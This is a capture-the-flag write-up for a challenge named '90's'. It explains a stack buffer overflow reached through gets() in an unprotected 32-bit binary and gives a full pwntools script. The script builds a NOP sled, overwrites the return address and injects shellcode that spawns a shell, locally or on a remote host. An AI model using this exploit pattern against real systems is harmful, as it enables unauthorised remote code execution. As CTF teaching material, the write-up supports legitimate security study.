# 90's

# Classic Buffer overflow - Ret2Shellcode
We are given a binary which has no protections enabled and a very straight forward vulnerability. When we look at the decompiled binary we can see a call to a very unsafe function `gets()` Then our input gets copied to another `500 byte` buffer. We can leverage the vulnerability in the `gets()` function which allows us to write past the buffer limit to then call our shellcode.

```sh
└─$ checksec chal           
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```


```python

#!/usr/bin/python3


import argparse
import yaml
from pwn import *
from pathlib import Path


def solve(sh):
    stack_addr = sh.recvline().strip().split()[-1]
    log.success(f"Buffer addr: {stack_addr.decode()}")
    padding = b"\x90"*500
    EIP = p32(int(stack_addr, 16) + 4 + len(padding))
    shellcode = asm(shellcraft.linux.sh())
    payload = padding + EIP + shellcode
    sh.sendline(payload)
    log.success("Payload sent!")
    sh.interactive()

def test(domain, port):
    sh = remote(domain, port)
    solve(sh)



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    parser = argparse.ArgumentParser()

    parser.add_argument("domain", default="0.0.0.0", nargs="?")
    parser.add_argument("port", default=1337, type=int, nargs="?")
    args_argparse = parser.parse_args()
    if args.REMOTE:
        test(args_argparse.domain, args_argparse.port)
    else:
        sh = process("./90-s")
        solve(sh)
```
